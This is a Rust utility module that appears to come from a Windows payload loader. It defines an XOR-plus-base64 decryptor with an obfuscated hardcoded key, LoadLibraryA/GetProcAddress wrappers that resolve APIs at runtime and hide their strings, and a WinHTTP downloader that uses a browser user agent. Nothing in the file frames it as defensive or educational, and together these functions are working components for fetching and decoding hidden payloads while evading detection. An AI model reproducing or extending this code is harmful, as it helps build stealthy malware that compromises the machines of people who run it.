#[cfg(feature = "debug")]
use colored::*;

#[cfg(feature = "debug")]
pub fn print_error(_prefix: &str, _error: &dyn std::fmt::Display) {
    println!("{} {}", _prefix.red(), _error);
}

#[cfg(feature = "debug")]
pub fn print_message(msg: &str) {
    println!("{}",msg.green());
}

#[allow(dead_code)]
pub fn simple_decrypt(encrypted: &str) -> String {
    use obfstr::obfbytes;
    use base64::{Engine as _, engine::general_purpose};
    let decoded = general_purpose::STANDARD.decode(encrypted).unwrap();
    let obf_key = obfbytes!(b"rsl_secret_key_2025");
    let key = obf_key.as_slice();
    let decrypted: Vec<u8> = decoded.iter().enumerate().map(|(i, &b)| b ^ key[i % key.len()]).collect();
    String::from_utf8(decrypted).unwrap()
}

#[allow(dead_code)]
pub unsafe fn load_library(dll_name: &[u8]) -> Result<isize, String> {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
    use obfstr::obfstr;
    let dll = LoadLibraryA(dll_name.as_ptr() as *const u8);
    if dll == 0 {
        Err(obfstr!("LoadLibraryA failed").to_string())
    } else {
        Ok(dll)
    }
}

#[allow(dead_code)]
pub unsafe fn get_proc_address(dll: isize, name: &[u8]) -> Result<*const (), String> {
    use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
    use obfstr::obfstr;
    let addr = GetProcAddress(dll, name.as_ptr() as *const u8);
    if let Some(f) = addr {
        Ok(f as *const ())
    } else {
        Err(obfstr!("GetProcAddress failed").to_string())
    }
}

#[allow(dead_code)]
pub fn http_get(url: &str) -> Result<(u16, Vec<u8>), String> {
    use windows::core::PCWSTR;
    use windows::Win32::Networking::WinHttp::{
        WinHttpCloseHandle, WinHttpConnect, WinHttpOpen, WinHttpOpenRequest, WinHttpQueryDataAvailable,
        WinHttpQueryHeaders, WinHttpReadData, WinHttpReceiveResponse, WinHttpSendRequest, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_FLAG_SECURE, WINHTTP_OPEN_REQUEST_FLAGS, WINHTTP_QUERY_STATUS_CODE, WINHTTP_QUERY_FLAG_NUMBER,
    };
    use std::ptr::{null, null_mut};
    use std::ffi::c_void;

    let (scheme, rest) = url.split_once("://").ok_or("Invalid URL format")?;
    let (host_port, path) = rest.split_once('/').unwrap_or((rest, ""));
    let path = format!("/{}", path);
    let (host, port) = if let Some((h, p)) = host_port.split_once(':') {
        (h, p.parse::<u16>().map_err(|_| "Invalid port")?)
    } else {
        (host_port, if scheme == "https" { 443 } else { 80 })
    };
    let is_ssl = scheme == "https";

    let to_wstring = |s: &str| -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    };

    let user_agent = to_wstring("Mozilla/5.0");
    let host_w = to_wstring(host);
    let path_w = to_wstring(&path);
    let method_w = to_wstring("GET");

    unsafe {
        let h_session = WinHttpOpen(
            PCWSTR(user_agent.as_ptr()),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            PCWSTR::null(),
            PCWSTR::null(),
            0,
        );
        
        if h_session.is_null() {
             return Err("WinHttpOpen failed".to_string());
        }

        let h_connect = WinHttpConnect(
            h_session,
            PCWSTR(host_w.as_ptr()),
            port,
            0,
        );
        if h_connect.is_null() {
            let _ = WinHttpCloseHandle(h_session);
            return Err("WinHttpConnect failed".to_string());
        }

        let flags = if is_ssl { WINHTTP_FLAG_SECURE } else { WINHTTP_OPEN_REQUEST_FLAGS(0) };
        let h_request = WinHttpOpenRequest(
            h_connect,
            PCWSTR(method_w.as_ptr()),
            PCWSTR(path_w.as_ptr()),
            PCWSTR::null(),
            PCWSTR::null(),
            null(),
            flags,
        );
        if h_request.is_null() {
            let _ = WinHttpCloseHandle(h_connect);
            let _ = WinHttpCloseHandle(h_session);
            return Err("WinHttpOpenRequest failed".to_string());
        }

        if let Err(_) = WinHttpSendRequest(
            h_request,
            None,
            None,
            0,
            0,
            0,
        ) {
            let _ = WinHttpCloseHandle(h_request);
            let _ = WinHttpCloseHandle(h_connect);
            let _ = WinHttpCloseHandle(h_session);
            return Err("WinHttpSendRequest failed".to_string());
        }

        if let Err(_) = WinHttpReceiveResponse(h_request, null_mut()) {
            let _ = WinHttpCloseHandle(h_request);
            let _ = WinHttpCloseHandle(h_connect);
            let _ = WinHttpCloseHandle(h_session);
            return Err("WinHttpReceiveResponse failed".to_string());
        }

        // Get status code
        let mut status_code: u32 = 0;
        let mut size = std::mem::size_of::<u32>() as u32;
        if let Err(_) = WinHttpQueryHeaders(
            h_request,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            PCWSTR::null(),
            Some(&mut status_code as *mut _ as *mut c_void),
            &mut size,
            null_mut(),
        ) {
            let _ = WinHttpCloseHandle(h_request);
            let _ = WinHttpCloseHandle(h_connect);
            let _ = WinHttpCloseHandle(h_session);
            return Err("WinHttpQueryHeaders failed".to_string());
        }

        let mut response_body = Vec::new();
        loop {
            let mut size = 0;
            if let Err(_) = WinHttpQueryDataAvailable(h_request, &mut size) {
                break;
            }
            if size == 0 {
                break;
            }

            let mut buffer = vec![0u8; size as usize];
            let mut read = 0;
            if let Err(_) = WinHttpReadData(
                h_request,
                buffer.as_mut_ptr() as *mut c_void,
                size,
                &mut read,
            ) {
                break;
            }
            buffer.truncate(read as usize);
            response_body.extend(buffer);
        }

        let _ = WinHttpCloseHandle(h_request);
        let _ = WinHttpCloseHandle(h_connect);
        let _ = WinHttpCloseHandle(h_session);

        Ok((status_code as u16, response_body))
    }
}
